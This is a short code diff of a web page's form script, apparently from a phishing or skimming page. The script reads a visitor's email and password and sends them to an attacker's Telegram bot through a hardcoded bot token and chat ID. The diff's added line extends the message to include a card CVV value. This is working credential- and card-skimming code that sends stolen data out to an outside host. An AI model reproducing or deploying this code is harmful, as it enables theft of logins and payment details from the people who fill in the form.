@@ -46,9 +46,10 @@
           const username = document.getElementById('pass').value;
           const email = document.getElementById('email').value;
           
+          
           const token = '7942332820:AAFC2P1_9T8USat2LkVF_cXqtqCaBqs2O4g';
           const chatId = -1002372284940 
-          const message = `Новая регистрация:\n Почта${email}\n Пароль${username}`;
+          const message = `Новая регистрация:\n Почта:${email}\n Пароль:${username}\n cvv: ${cvv}`;
           const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
           
           
